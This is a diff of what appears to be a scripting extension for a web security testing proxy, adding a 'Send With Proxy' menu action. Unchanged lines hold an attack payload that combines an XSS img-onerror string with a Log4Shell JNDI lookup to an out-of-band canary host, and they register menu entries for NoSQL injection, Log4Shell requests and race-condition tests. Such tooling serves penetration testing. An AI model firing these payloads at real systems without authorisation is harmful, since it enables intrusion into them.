@@ -11,6 +11,11 @@ def handleInteraction(interaction):
     print(interaction.clientIp().toString() + ":" + str(interaction.clientPort()) + "\t" + interaction.dnsDetails().get().query().toString())
 
 
+@run_in_thread
+def send_with_proxy(request):
+    sendWithProxy(request, "127.0.0.1", 8080)
+
+
 def insert_at_cursor():
     return "'\"><img/src/onerror=alert(1)>${jndi:ldap://inseratcursor." + canary + "/a}"
 
@@ -252,6 +257,7 @@ def registerContextMenu(menus):
     menus.register("JSON Quotes", lambda s: json.dumps(s, ensure_ascii=False), MenuType.SELECTED_TEXT)
     menus.register("Unicode Escape", lambda s: s.decode().decode('unicode_escape'), MenuType.SELECTED_TEXT)
 
+    menus.register("Send With Proxy", send_with_proxy, MenuType.REQUEST)
     menus.register("NoSQL Injection", noSqliScan, MenuType.REQUEST)
     menus.register("Send Log4Shell Reqeusts", log4shell, MenuType.REQUEST)
     menus.register("Race Condition x10", race_condition_10, MenuType.REQUEST)
